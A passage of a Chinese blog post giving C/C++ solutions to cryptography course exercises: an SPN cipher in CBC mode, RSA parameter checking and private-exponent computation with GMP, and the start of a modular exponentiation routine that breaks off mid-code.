class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="comment">// 密钥， 明文， 密文， 初始向量</span></span><br><span class="line">	<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> k[<span class="number">5</span>] = &#123; <span class="number">0</span> &#125;, plaintext[<span class="number">1</span>] = &#123; <span class="number">0</span> &#125;, ciphertext[<span class="number">1</span>] = &#123; <span class="number">0</span> &#125;, initialValue = <span class="number">22220012</span>;</span><br><span class="line">	<span class="built_in">fread</span>(k, SPNBYTES, <span class="number">1</span>, stdin);</span><br><span class="line">	<span class="built_in">fread</span>(k + <span class="number">4</span>, SPNBYTES, <span class="number">1</span>, stdin);</span><br><span class="line">	k[<span class="number">1</span>] = ((k[<span class="number">0</span>] &lt;&lt; <span class="number">16</span>) &amp; <span class="number">0xffffffffffff0000</span>) ^ ((k[<span class="number">4</span>] &gt;&gt; <span class="number">48</span>) &amp; <span class="number">0xffff</span>);</span><br><span class="line">	k[<span class="number">2</span>] = ((k[<span class="number">0</span>] &lt;&lt; <span class="number">32</span>) &amp; <span class="number">0xffffffff00000000</span>) ^ ((k[<span class="number">4</span>] &gt;&gt; <span class="number">32</span>) &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">	k[<span class="number">3</span>] = ((k[<span class="number">0</span>] &lt;&lt; <span class="number">48</span>) &amp; <span class="number">0xffff000000000000</span>) ^ ((k[<span class="number">4</span>] &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xffffffffffffff</span>);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">fread</span>(plaintext, SPNBYTES, <span class="number">1</span>, stdin);</span><br><span class="line">	plaintext[<span class="number">0</span>] ^= initialValue;</span><br><span class="line">	ciphertext[<span class="number">0</span>] = <span class="built_in">SPN</span>(k, plaintext[<span class="number">0</span>], <span class="number">0</span>);</span><br><span class="line">	<span class="built_in">fwrite</span>(ciphertext, SPNBYTES, <span class="number">1</span>, stdout);</span><br><span class="line">	<span class="comment">// CBC模式</span></span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; (INPUTBYTES / SPNBYTES); i++) &#123;</span><br><span class="line">		<span class="built_in">fread</span>(plaintext, SPNBYTES, <span class="number">1</span>, stdin);</span><br><span class="line">		plaintext[<span class="number">0</span>] ^= ciphertext[<span class="number">0</span>];</span><br><span class="line">		ciphertext[<span class="number">0</span>] = <span class="built_in">SPN</span>(k, plaintext[<span class="number">0</span>], <span class="number">0</span>);</span><br><span class="line">		<span class="built_in">fwrite</span>(ciphertext, SPNBYTES, <span class="number">1</span>, stdout);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="RSA参数计算"><a href="#RSA参数计算" class="headerlink" title="RSA参数计算"></a>RSA参数计算</h4><p>题目链接：<a href="http://10.12.162.1:5880/contest/20/problem/V">oj | RSA参数计算</a></p>
<p>题目要求：<img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20211030110915.png" alt="RSA参数计算"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;gmp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span>   </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;time.h&gt;</span>   </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> MAX 1&lt;&lt;31</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> test_num[] = &#123;</span><br><span class="line">  <span class="number">2</span>,<span class="number">3</span>,<span class="number">5</span>,<span class="number">7</span>,<span class="number">11</span>,<span class="number">13</span>,<span class="number">17</span>,<span class="number">19</span>,<span class="number">23</span>,<span class="number">29</span>,<span class="number">31</span>,<span class="number">37</span>,<span class="number">41</span>,<span class="number">43</span>,<span class="number">47</span>,<span class="number">53</span>,<span class="number">59</span>,<span class="number">61</span>,<span class="number">67</span>,<span class="number">71</span>,<span class="number">73</span>,<span class="number">79</span>,<span class="number">83</span>,<span class="number">89</span>,<span class="number">97</span>,<span class="number">101</span>,<span class="number">103</span>,</span><br><span class="line">  <span class="number">107</span>,<span class="number">109</span>,<span class="number">113</span>,<span class="number">127</span>,<span class="number">131</span>,<span class="number">137</span>,<span class="number">139</span>,<span class="number">149</span>,<span class="number">151</span>,<span class="number">157</span>,<span class="number">163</span>,<span class="number">167</span>,<span class="number">173</span>,<span class="number">179</span>,<span class="number">181</span>,<span class="number">191</span>,<span class="number">193</span>,<span class="number">197</span>,<span class="number">199</span> &#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">diygcd</span><span class="params">(<span class="keyword">mpz_t</span> a, <span class="keyword">mpz_t</span> b, <span class="keyword">mpz_t</span> max)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">mpz_t</span> rt, at, bt;</span><br><span class="line">    <span class="built_in">mpz_init</span>(rt);</span><br><span class="line">    <span class="built_in">mpz_init_set</span>(at, a);</span><br><span class="line">    <span class="built_in">mpz_init_set</span>(bt, b);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">mpz_cmp</span>(at, bt) &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">mpz_swap</span>(at, bt);</span><br><span class="line">    <span class="built_in">mpz_mod</span>(rt, at, bt);</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">mpz_cmp_ui</span>(rt, <span class="number">0</span>) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">mpz_set</span>(at, bt);</span><br><span class="line">        <span class="built_in">mpz_set</span>(bt, rt);</span><br><span class="line">        <span class="built_in">mpz_mod</span>(rt, at, bt);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">mpz_set</span>(max, bt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">expmod</span><span class="params">(<span class="keyword">mpz_t</span> e, <span class="keyword">mpz_t</span> m, <span class="keyword">mpz_t</span> N, <span class="keyword">mpz_t</span> b)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">mpz_t</span> i, r, result;</span><br><span class="line">    <span class="built_in">mpz_init</span>(i); <span class="built_in">mpz_init</span>(r); <span class="built_in">mpz_init</span>(result);</span><br><span class="line">    <span class="built_in">mpz_set</span>(i, e);</span><br><span class="line">    <span class="built_in">mpz_set_ui</span>(result, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">mpz_cmp_ui</span>(i, <span class="number">1</span>) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">mpz_cdiv_r_ui</span>(r, i, <span class="number">2</span>);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">mpz_cmp_ui</span>(r, <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">mpz_mul</span>(m, m, m);</span><br><span class="line">            <span class="built_in">mpz_cdiv_q_ui</span>(i, i, <span class="number">2</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">mpz_mul</span>(result, result, m);</span><br><span class="line">            <span class="built_in">mpz_sub_ui</span>(i, i, <span class="number">1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">mpz_mod</span>(m, m, N);</span><br><span class="line">        <span class="built_in">mpz_mod</span>(result, result, N);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">mpz_mul</span>(b, m, result);</span><br><span class="line">    <span class="built_in">mpz_mod</span>(b, b, N);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">PrimeJudge</span><span class="params">(<span class="keyword">mpz_t</span> n, <span class="keyword">int</span> limit)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">mpz_cmp_ui</span>(n, <span class="number">1</span>) == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> test_len = <span class="built_in"><span class="keyword">sizeof</span></span>(test_num) / <span class="built_in"><span class="keyword">sizeof</span></span>(<span class="keyword">int</span>);</span><br><span class="line">    <span class="keyword">int</span> sign;</span><br><span class="line">    <span class="keyword">int</span> k = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> i, t;</span><br><span class="line">    <span class="keyword">mpz_t</span> test;</span><br><span class="line">    <span class="built_in">mpz_init</span>(test);</span><br><span class="line">    sign = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; test_len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">mpz_cmp_ui</span>(n, test_num[i]) == <span class="number">0</span>)</span><br><span class="line">            sign = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (sign)</span><br><span class="line">        <span class="keyword">return</span> sign;</span><br><span class="line">    sign = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; test_len; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">mpz_mod_ui</span>(test, n, test_num[i]);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">mpz_cmp_ui</span>(test, <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">            sign = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (sign == <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    sign = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">mpz_t</span> m, a, b, j, r;</span><br><span class="line">    <span class="built_in">mpz_init</span>(m); <span class="built_in">mpz_init</span>(a); <span class="built_in">mpz_init</span>(b); <span class="built_in">mpz_init</span>(j); <span class="built_in">mpz_init</span>(r);</span><br><span class="line">    <span class="built_in">mpz_sub_ui</span>(m, n, <span class="number">1</span>);</span><br><span class="line">    <span class="built_in">mpz_sub_ui</span>(r, n, <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">mpz_tstbit</span>(m, <span class="number">0</span>))</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        k++;</span><br><span class="line">        <span class="built_in">mpz_cdiv_q_ui</span>(m, m, <span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">gmp_randstate_t</span> state;</span><br><span class="line">    <span class="keyword">for</span> (<span class="built_in">mpz_set_ui</span>(a, <span class="number">2</span>); <span class="built_in">mpz_cmp_ui</span>(a, limit) &lt;= <span class="number">0</span> &amp;&amp; <span class="built_in">mpz_cmp</span>(a, r) &lt;= <span class="number">0</span>; <span class="built_in">mpz_add_ui</span>(a, a, <span class="number">1</span>)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">mpz_cmp_ui</span>(a, <span class="number">0</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">expmod</span>(m, a, n, b);</span><br><span class="line">        sign = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">mpz_cmp_ui</span>(b, <span class="number">1</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">            sign = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (t = <span class="number">0</span>; t &lt; k; t++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">mpz_cmp</span>(b, r) == <span class="number">0</span>) &#123;</span><br><span class="line">                sign = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="built_in">mpz_mul</span>(b, b, b);</span><br><span class="line">                <span class="built_in">mpz_mod</span>(b, b, n);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (sign == <span class="number">0</span>)<span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">mpz_clear</span>(m); <span class="built_in">mpz_clear</span>(a); <span class="built_in">mpz_clear</span>(b); <span class="built_in">mpz_clear</span>(j); <span class="built_in">mpz_clear</span>(r);</span><br><span class="line">    <span class="keyword">return</span> sign;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">invert</span><span class="params">(<span class="keyword">mpz_t</span> d, <span class="keyword">mpz_t</span> e, <span class="keyword">mpz_t</span> yN)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">mpz_t</span> x1, x2, x3, y1, y2, y3, z1, z2, z3, k, p, temp;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">mpz_init</span>(x1);</span><br><span class="line">    <span class="built_in">mpz_init</span>(x2);</span><br><span class="line">    <span class="built_in">mpz_init</span>(x3);</span><br><span class="line">    <span class="built_in">mpz_init</span>(y1);</span><br><span class="line">    <span class="built_in">mpz_init</span>(y2);</span><br><span class="line">    <span class="built_in">mpz_init</span>(y3);</span><br><span class="line">    <span class="built_in">mpz_init</span>(z1);</span><br><span class="line">    <span class="built_in">mpz_init</span>(z2);</span><br><span class="line">    <span class="built_in">mpz_init</span>(z3);</span><br><span class="line">    <span class="built_in">mpz_init</span>(k);</span><br><span class="line">    <span class="built_in">mpz_init</span>(p);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">diygcd</span>(e, yN, temp);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">mpz_cmp_ui</span>(temp, <span class="number">1</span>) != <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">mpz_init_set</span>(temp, yN);</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">mpz_cmp</span>(e, yN) &gt; <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">mpz_swap</span>(e, yN);</span><br><span class="line">    <span class="built_in">mpz_set_ui</span>(x1, <span class="number">1</span>); <span class="built_in">mpz_set_ui</span>(x2, <span class="number">0</span>); <span class="built_in">mpz_set</span>(x3, yN);</span><br><span class="line">    <span class="built_in">mpz_set_ui</span>(y1, <span class="number">0</span>); <span class="built_in">mpz_set_ui</span>(y2, <span class="number">1</span>); <span class="built_in">mpz_set</span>(y3, e);</span><br><span class="line">    <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">mpz_cmp_ui</span>(y3, <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">mpz_set_ui</span>(d, <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">mpz_cmp_ui</span>(y3, <span class="number">1</span>) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="built_in">mpz_set</span>(d, y2);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">mpz_mod</span>(p, x3, y3);</span><br><span class="line">        <span class="built_in">mpz_sub</span>(k, x3, p);</span><br><span class="line">        <span class="built_in">mpz_cdiv_q</span>(k, k, y3);</span><br><span class="line">        <span class="built_in">mpz_mul</span>(z1, k, y1);</span><br><span class="line">        <span class="built_in">mpz_sub</span>(z1, x1, z1);</span><br><span class="line">        <span class="built_in">mpz_mul</span>(z2, k, y2);</span><br><span class="line">        <span class="built_in">mpz_sub</span>(z2, x2, z2);</span><br><span class="line">        <span class="built_in">mpz_mul</span>(z3, k, y3);</span><br><span class="line">        <span class="built_in">mpz_sub</span>(z3, x3, z3);</span><br><span class="line">        <span class="built_in">mpz_set</span>(x1, y1);</span><br><span class="line">        <span class="built_in">mpz_set</span>(x2, y2);</span><br><span class="line">        <span class="built_in">mpz_set</span>(x3, y3);</span><br><span class="line">        <span class="built_in">mpz_set</span>(y1, z1);</span><br><span class="line">        <span class="built_in">mpz_set</span>(y2, z2);</span><br><span class="line">        <span class="built_in">mpz_set</span>(y3, z3);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">mpz_cmp_ui</span>(d, <span class="number">0</span>) &lt;= <span class="number">0</span>)</span><br><span class="line">        <span class="built_in">mpz_add</span>(d, d, temp);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">//问题的个数</span></span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    cin &gt;&gt; n;</span><br><span class="line">    <span class="comment">//存储大整数</span></span><br><span class="line">    <span class="keyword">char</span> temp[<span class="number">1024</span>];</span><br><span class="line">    <span class="keyword">mpz_t</span> e, p, q, maxdiv;</span><br><span class="line">    <span class="built_in">mpz_init</span>(e);</span><br><span class="line">    <span class="built_in">mpz_init</span>(p);</span><br><span class="line">    <span class="built_in">mpz_init</span>(q);</span><br><span class="line">    <span class="built_in">mpz_init</span>(maxdiv);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">int</span> sign = <span class="number">0</span>;</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, temp);</span><br><span class="line">        <span class="built_in">mpz_set_str</span>(e, temp, <span class="number">10</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, temp);</span><br><span class="line">        <span class="built_in">mpz_set_str</span>(p, temp, <span class="number">10</span>);</span><br><span class="line">        <span class="built_in">scanf</span>(<span class="string">&quot;%s&quot;</span>, temp);</span><br><span class="line">        <span class="built_in">mpz_set_str</span>(q, temp, <span class="number">10</span>);</span><br><span class="line">        <span class="comment">//判断e是否足够大</span></span><br><span class="line">        <span class="keyword">int</span> compare = <span class="built_in">mpz_cmp_ui</span>(e, <span class="number">65536</span>);</span><br><span class="line">        <span class="keyword">if</span> (compare &lt;= <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;ERROR&quot;</span> &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//判断素数</span></span><br><span class="line">        sign = <span class="built_in">PrimeJudge</span>(p, <span class="number">20</span>) + <span class="built_in">PrimeJudge</span>(q, <span class="number">20</span>);</span><br><span class="line">        <span class="keyword">if</span> (sign &lt; <span class="number">2</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;ERROR&quot;</span> &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//判断p,q间隔</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">mpz_cmp</span>(p, q) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;ERROR&quot;</span> &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">mpz_t</span> tool, N;</span><br><span class="line">        <span class="built_in">mpz_init</span>(N);</span><br><span class="line">        <span class="built_in">mpz_init</span>(tool);</span><br><span class="line">        <span class="built_in">mpz_mul</span>(N, p, q);</span><br><span class="line">        <span class="built_in">mpz_sqrt</span>(N, N);</span><br><span class="line"></span><br><span class="line">        <span class="built_in">mpz_sub</span>(tool, p, N);</span><br><span class="line">        <span class="built_in">mpz_abs</span>(tool, tool);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">mpz_cmp_ui</span>(tool, MAX) &lt;= <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;ERROR&quot;</span> &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">mpz_sub</span>(tool, q, N);</span><br><span class="line">        <span class="built_in">mpz_abs</span>(tool, tool);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">mpz_cmp_ui</span>(tool, MAX) &lt;= <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;ERROR&quot;</span> &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">mpz_t</span> yN, d, p1, q1;</span><br><span class="line">        <span class="built_in">mpz_init</span>(yN);</span><br><span class="line">        <span class="built_in">mpz_init</span>(d);</span><br><span class="line">        <span class="built_in">mpz_init</span>(p1);</span><br><span class="line">        <span class="built_in">mpz_init</span>(q1);</span><br><span class="line">        <span class="built_in">mpz_sub_ui</span>(p1, p, <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">mpz_sub_ui</span>(q1, q, <span class="number">1</span>);</span><br><span class="line">        <span class="built_in">mpz_mul</span>(yN, p1, q1);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//判断p1和q1的最大公因子的大小</span></span><br><span class="line">        <span class="built_in">diygcd</span>(q1, p1, maxdiv);</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">mpz_cmp_ui</span>(maxdiv, <span class="number">16</span>) &gt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;ERROR&quot;</span> &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//求d</span></span><br><span class="line">        <span class="keyword">int</span> choice = <span class="built_in">invert</span>(d, e, yN);</span><br><span class="line">        <span class="keyword">if</span> (!choice)</span><br><span class="line">        &#123;</span><br><span class="line">            cout &lt;&lt; <span class="string">&quot;ERROR&quot;</span> &lt;&lt; endl;</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">gmp_printf</span>(<span class="string">&quot;%Zd\n&quot;</span>, d);</span><br><span class="line">        <span class="built_in">mpz_clear</span>(yN);</span><br><span class="line">        <span class="built_in">mpz_clear</span>(d);</span><br><span class="line">        <span class="built_in">mpz_clear</span>(p1);</span><br><span class="line">        <span class="built_in">mpz_clear</span>(q1);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">mpz_clear</span>(e);</span><br><span class="line">    <span class="built_in">mpz_clear</span>(p);</span><br><span class="line">    <span class="built_in">mpz_clear</span>(q);</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="模重复平方"><a href="#模重复平方" class="headerlink" title="模重复平方"></a>模重复平方</h4><p>题目链接：<a href="http://10.12.162.1:5880/contest/20/problem/VI">oj | 模重复平方</a></p>
<p>题目要求：<img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20211030111526.png" alt="模重复平方"></p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&quot;gmp.h&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">&quot;libgmp-10.lib&quot;</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">calInverse</span><span class="params">(<span class="keyword">mpz_t</span> eInverse, <span class="keyword">mpz_t</span> paraE, <span class="keyword">mpz_t</span> paraN)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">mpz_t</span> st[<span class="number">5000</span>];</span><br><span class="line">	<span class="keyword">int</span> count = <span class="number">-1</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">5000</span>; i++) &#123;</span><br><span class="line">		<span class="built_in">mpz_init</span>(st[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">mpz_t</span> n, temp, temp1, temp2, e;</span><br><span class="line">	<span class="built_in">mpz_init_set</span>(e, paraE);</span><br><span class="line">	<span class="built_in">mpz_init_set</span>(n, paraN);</span><br><span class="line">	<span class="built_in">mpz_init</span>(temp);</span><br><span class="line">	<span class="built_in">mpz_init</span>(temp1);</span><br><span class="line">	<span class="built_in">mpz_init</span>(temp2);</span><br><span class="line">	<span class="built_in">mpz_init_set_ui</span>(temp, <span class="number">0</span>);</span><br><span class="line">	<span class="built_in">mpz_sub</span>(n, temp, n);</span><br><span class="line">	<span class="comment">// 求解e的逆</span></span><br><span class="line">	<span class="built_in">mpz_mod</span>(temp, e, n);</span><br><span class="line">	<span class="built_in">mpz_sub</span>(temp1, e, temp);</span><br><span class="line">	<span class="built_in">mpz_div</span>(temp1, temp1, n);</span><br><span class="line">	<span class="built_in">mpz_init_set</span>(st[<span class="number">0</span>], temp1);</span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">mpz_cmp_ui</span>(temp, <span class="number">0</span>) != <span class="number">0</span>) &#123;</span><br><span class="line">		count++;</span><br><span class="line">		<span class="built_in">mpz_init_set</span>(st[count], temp1);</span><br><span class="line">		<span class="built_in">mpz_init_set</span>(e, n);</span><br><span class="line">		<span class="built_in">mpz_init_set</span>(n, temp);</span><br><span class="line">		<span class="built_in">mpz_mod</span>(temp, e, n);</span><br><span class="line">		<span class="built_in">mpz_sub</span>(temp1, e, temp);</span><br><span class="line">		<span class="built_in">mpz_div</span>(temp1, temp1, n);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">mpz_init_set_ui</span>(temp1, <span class="number">0</span>);</span><br><span class="line">	<span class="built_in">mpz_init_set_ui</span>(temp2, <span class="number">1</span>);</span><br><span class="line">	<span class="built_in">mpz_sub</span>(n, temp1, n);</span><br><span class="line">	<span class="keyword">for</span> (<span class="keyword">int</span> i = count; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">		<span class="built_in">mpz_init_set</span>(temp, temp2);</span><br><span class="line">		<span class="built_in">mpz_mul</span>(temp2, temp2, st[i]);</span><br><span class="line">		<span class="built_in">mpz_sub</span>(temp2, temp1, temp2);</span><br><span class="line">		<span class="built_in">mpz_init_set</span>(temp1, temp);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//gmp_printf(&quot;%Zd\n&quot;, temp1);</span></span><br><span class="line">	<span class="built_in">mpz_set</span>(eInverse, temp1);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">expmod</span><span class="params">(<span class="keyword">mpz_t</span> a, <span class="keyword">mpz_t</span> paraE, <span class="keyword">mpz_t</span> paraN)</span> </span>&#123;</span><br><span class="line">	<span class="keyword">mpz_t</span> e, n, eBack, aPow, temp;</span><br><span class="line">	<span class="built_in">mpz_init_set</span>(e, paraE);</span><br><span class="line">	<span class="built_in">mpz_init_set</span>(n, paraN);</span><br><span class="line">	<span class="built_in">mpz_init_set</span>(eBack, e);</span><br><span class="line">	<span class="built_in">mpz_init_set</span>(aPow, a);</span><br><span class="line">	<span class="built_in">mpz_init</span>(temp);</span><br><span class="line">	<span class="built_in">mpz_set_ui</span>(a, <span class="number">1</span>);</span><br><span class="line">	<span class="built_in">mpz_mod_ui</span>(temp, eBack, <span class="number">2</span>);	<span class="comment">// 一些准备工作</span></span><br><span class="line">	<span class="keyword">while</span> (<span class="built_in">mpz_cmp_ui</span>(eBack, <span class="number">0</span>) != <span class="number">0</span>) &#123;		<span class="comment">// 当还没被除完时</span></span><br><span class="line">		<span class="keyword">if</span> (<span class="built_in">mpz_cmp_ui</span>(temp, <span class="number">1</span>) == <span class="number">0</span>) &#123;		<span class="comment">// 余数为1，则加上</span></span><br><span class="line">			<span class="built_in">mpz_mul</span>(a, a, aPow);</span><br><span class="line">			<span class="built_in">mpz_mod</span>(a, a, n);</span><br><span class="line">		&#125;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> DEBUG</span></span><br><span class="line">		<span class="built_in">gmp_printf</span>(<span class="string">&quot;a = %Zd\n&quot;</span>, a);</span><br><span class="line">		<span class="built_in">gmp_printf</span>(<span 